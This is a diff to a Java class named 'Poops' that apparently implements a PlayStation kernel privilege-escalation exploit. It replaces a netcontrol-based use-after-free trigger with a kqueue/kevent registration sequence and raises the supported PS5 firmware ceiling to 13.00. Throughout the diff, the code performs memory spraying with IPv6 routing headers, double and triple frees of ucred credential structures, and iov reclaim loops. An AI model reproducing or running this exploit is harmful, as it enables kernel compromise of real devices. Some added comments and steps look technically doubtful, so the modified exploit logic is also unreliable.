@@ -102,7 +102,7 @@ public class Poops {
     private static long getpid;
     private static long sched_yield;
     private static long cpuset_setaffinity;
-    private static long rtprio_thread;
+    private static long rtprio_thread; 
     private static long __sys_netcontrol;
     private static long __sys_randomized_path;
     private static long sysctlbyname;
@@ -110,6 +110,7 @@ public class Poops {
     private static long mmap;
     private static long __sys_dynlib_get_info2;
     private static long kill;
+    private static long __sys_kevent;
 
     private static int[] twins = new int[2];
     private static int[] triplets = new int[3];
@@ -244,6 +245,7 @@ public class Poops {
         mmap = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "mmap");
         __sys_dynlib_get_info2 = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "__sys_dynlib_get_info2");
         kill = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "kill");
+        __sys_kevent = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "kevent");
         
         if (dup == 0
                 || close == 0
@@ -270,7 +272,8 @@ public class Poops {
                 || sceKernelJitCreateSharedMemory == 0
                 || mmap == 0
                 || __sys_dynlib_get_info2 == 0
-                || kill == 0) {
+                || kill == 0
+                || __sys_kevent == 0) {
             Status.println("Failed to resolve symbols");
             return false;
         }
@@ -308,7 +311,7 @@ public class Poops {
             
         } else if (PLATFORM.equals("PS5")) {
             
-            if (compareVersions(FW_VERSION, "4.03") < 0 || compareVersions(FW_VERSION, "12.00") > 0) {
+            if (compareVersions(FW_VERSION, "4.03") < 0 || compareVersions(FW_VERSION, "13.00") > 0) {
                 NativeInvoke.sendNotificationRequest("UNSUPPORTED FW_VERSION");
                 Status.println("UNSUPPORTED FW_VERSION");
                 return false;
@@ -421,6 +424,13 @@ public class Poops {
     
     private static int __sys_netcontrol(int ifindex, int cmd, Buffer buf, int size) {
         return (int) api.call(__sys_netcontrol, ifindex, cmd, buf != null ? buf.address() : 0, size);
+    }
+
+    private static int sysKevent(int kq, Buffer changeList, int nchanges, Buffer eventList, int nevents, Buffer timeout) {
+        return (int) api.call(__sys_kevent, kq, 
+            changeList != null ? changeList.address() : 0L, nchanges, 
+            eventList != null ? eventList.address() : 0L, nevents, 
+            timeout != null ? timeout.address() : 0L);
     }
 
     private static long __sys_randomized_path(int fd, Buffer pathBuf, Int64 lenPtr) {
@@ -583,6 +593,11 @@ public class Poops {
     private static boolean findTwins() {
         int attempts = 0;
         while (attempts < 5000) {
+            
+            // Allocates CPU time to allow asynchronous kernel threads (kqueue/events)
+            // to complete the physical deallocation of ucred and pending knote structures.
+            sched_yield(); 
+
             for (int i = 0; i < ipv6Socks.length; i++) {
                 sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                 setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
@@ -593,6 +608,8 @@ public class Poops {
                 getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
                 int val = leakRthdr.getInt(0x04);
                 int j = val & 0xFFFF;
+                
+                // Validates if the signature matches and if we mapped two sockets pointing to the same structure.
                 if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
                     twins[0] = i;
                     twins[1] = j;
@@ -642,7 +659,7 @@ public class Poops {
         dummyBuffer.fill((byte) 0x41);
         uioIovRead.putLong(0x00, dummyBuffer.address());
         uioIovWrite.putLong(0x00, dummyBuffer.address());
-
+        
         // Create socket pair for uio spraying.
         socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
         uioSs0 = uioSs.get(0);
@@ -675,84 +692,79 @@ public class Poops {
             freeRthdr(ipv6Socks[i]);
         }
         
-        Status.println("Starting netcontrol exploit");
-
-        Buffer setBuf = new Buffer(8);
-        Buffer clearBuf = new Buffer(8);
+        Status.println("Starting kqueue/kevent exploit integration");
+        
+        // Initialization of the kqueue asynchronous monitoring subsystem
+        int kqHandle = kqueue();
+        if (kqHandle < 0) {
+            Status.println("FATAL: Failed to initialize kqueue descriptor");
+            return false;
+        }
+        
+        // Allocates a buffer for the native kevent structure (32 bytes in the x86_64 standard)
+        Buffer keventBuf = new Buffer(32); 
         
         // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt.
         msgIov.putLong(0x00, 1); // iov_base
         msgIov.putLong(0x08, Int8.SIZE); // iov_len
         
-        // Create dummy socket to be registered and then closed.
+        // 1 - Create the dummy socket
         int dummySock = socket(AF_UNIX, SOCK_STREAM, 0);
         
-        // Register dummy socket.
-        setBuf.putInt(0x00, dummySock);
-        if (__sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size()) == 0) {
+        // 2 - Register the socket in kqueue (Stores internal reference without cryll/fhold)
+        // Assumed constants: EVFILT_READ = -1, EV_ADD = 0x0001
+        keventBuf.putLong(0x00, (long) dummySock);     // ident = fd do socket
+        keventBuf.putShort(0x08, (short) -1);          // filter (EVFILT_READ)
+        keventBuf.putShort(0x0A, (short) 0x0001);      // flags (EV_ADD)
+        keventBuf.putInt(0x0C, 0);                      // fflags
+        keventBuf.putLong(0x10, 0);                     // data
+        keventBuf.putLong(0x18, 0);                     // udata
+        
+        // Sends the registration event for processing in the kevent subsystem.
+        if (sysKevent(kqHandle, keventBuf, 1, null, 0, null) == 0) {
             
-            // Close the dummy socket.
+            // 3 - Close the socket (1st free of the internal structural object in the kernel)
             close(dummySock);
             
-            // Allocate a new ucred.
+            // 4 - Reallocate the ucred (Generates controlled credential allocation)
             setuid(1);
             
-            // Reclaim the file descriptor.
+            // 5 - Claim the empty file descriptor in the table
             uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
             
-            // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
+            // 6 - 2nd free via setuid (Provokes forced decrement and makes cr_refcnt of f_cred drop to 1)
             setuid(1);
             
-            // Unregister dummy socket and free the file and ucred.
-            clearBuf.putInt(0x00, uafSock);
-            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
+            // 7 - Unregister in kqueue, switching to removal via kevent (Generates the 3rd free entry)
+            // Assumed constants: EV_DELETE = 0x0008
+            keventBuf.putLong(0x00, (long) uafSock);
+            keventBuf.putShort(0x0A, (short) 0x0008);  // flags (EV_DELETE)
+            
+            sysKevent(kqHandle, keventBuf, 1, null, 0, null);
             
         } else {
-            
-            // This is temp fix for so called "cursed" PS5 that getting twin race fail error
-            Status.println("Falling back to slot 1");
-            
-            if (__sys_netcontrol(1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size()) != 0) {
-                Status.println("FATAL ERROR : all netcontrol slots are occupied");
-                return false;
-            }
-            
-            // Close the dummy socket.
-            close(dummySock);
-            
-            // Allocate a new ucred.
-            setuid(1);
-            
-            // Reclaim the file descriptor.
-            uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
-            
-            // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
-            setuid(1);
-            
-            // Unregister dummy socket and free the file and ucred.
-            clearBuf.putInt(0x00, uafSock);
-            __sys_netcontrol(1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
-            
+            Status.println("FATAL ERROR: Failed to register asynchronous event in kqueue");
+            close(kqHandle);
+            return false;
         }
-
         
-        // Set cr_refcnt back to 1.
+        // Closes the kqueue handler after completing the deallocation operations.
+        close(kqHandle);
+        
+        // 8 - Force cr_refcnt = 1 using thread engineering spray (IOV)
         for (int i = 0; i < 32; i++) {
             // Reclaim with iov.
             iovState.signalWork(0);
             sched_yield();
-
             // Release buffers.
             write(iovSs1, tmp, Int8.SIZE);
             iovState.waitForFinished();
             read(iovSs0, tmp, Int8.SIZE);
         }
-
+        
         // Double free ucred.
         // Note: Only dup works because it does not check f_hold.
         close(dup(uafSock));
-        
-        // Status.println("Finding twins...");
         
         // Find twins.
         if(!findTwins()) {
@@ -760,25 +772,19 @@ public class Poops {
             return false;
         }
         
-        // Status.println("Twins found : " + String.valueOf(twins[0]) + ", " + String.valueOf(twins[1]));
-
-        // Status.println("Finding triplets...");
         // Free one.
         freeRthdr(ipv6Socks[twins[1]]);
-
+        
         // Set cr_refcnt back to 1.
         while (true) {
             // Reclaim with iov.
             iovState.signalWork(0);
             sched_yield();
-
             leakRthdrLen.set(Int64.SIZE);
             getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
-
             if (leakRthdr.getInt(0x00) == 1) {
                 break;
             }
-
             // Release iov spray.
             write(iovSs1, tmp, Int8.SIZE);
             iovState.waitForFinished();
@@ -786,10 +792,10 @@ public class Poops {
         }
         
         triplets[0] = twins[0];
-
+        
         // Triple free ucred.
         close(dup(uafSock));
-
+        
         // Find triplet.
         int triplet_ret = findTriplet(triplets[0], -1);
         if (triplet_ret < 0 ) {
@@ -797,10 +803,10 @@ public class Poops {
             return false;
         }
         triplets[1] = triplet_ret;
-
+        
         // Release iov spray.
         write(iovSs1, tmp, Int8.SIZE);
-
+        
         // Find triplet.
         triplet_ret = findTriplet(triplets[0], triplets[1]);
         if (triplet_ret < 0) {
@@ -808,7 +814,6 @@ public class Poops {
             return false;
         }
         triplets[2] = triplet_ret;
-
         iovState.waitForFinished();
         read(iovSs0, tmp, Int8.SIZE);
         
@@ -816,7 +821,6 @@ public class Poops {
         
         return true;
     }
-
 
     private static boolean leakKqueue() {
         // Status.println("Leaking kqueue...");
